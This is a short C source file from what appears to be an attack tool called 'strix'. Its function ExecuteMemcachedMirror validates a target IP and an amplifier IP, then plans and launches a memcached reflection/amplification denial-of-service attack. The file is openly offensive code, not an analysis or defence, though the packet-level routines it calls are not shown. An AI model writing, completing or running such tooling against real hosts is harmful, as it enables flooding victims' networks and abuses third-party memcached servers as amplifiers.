
#include "strix.h"
#include "planner.h"
#include "executor.h"
#include "common/common.h"
#include "common/injector.h"

#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define INVALID_DRAFT 1;

AttackPlan * plan = NULL;

static void stopStrix( )
{
  if(NULL == plan ){
    return;
  }

  for(int i = 0; i < plan->totalPlans; i++)
  {
    DestroyAttack(plan->atkPlans[i]); 
  }

  DestroyStrixPlan(&plan);
}

static bool _validadeDraft( AttackDraft * draft)
{
  assert( NULL != draft );

  if( NULL == draft->target_ip || !is_valid_ipv4(draft->target_ip )){
    return false;
  }

  if( NULL == draft->amp_ip || !is_valid_ipv4(draft->amp_ip )){
    return false;
  }

  return true;
}

void * ExecuteMemcachedMirror( void *draft )
{
   
  if( !_validadeDraft(draft) ){
    stopStrix();
    return NULL;
  }

  plan = StrixPlanner( draft, 1 );

  ExecuteAttack( plan->atkPlans[0] );
  return NULL;
}


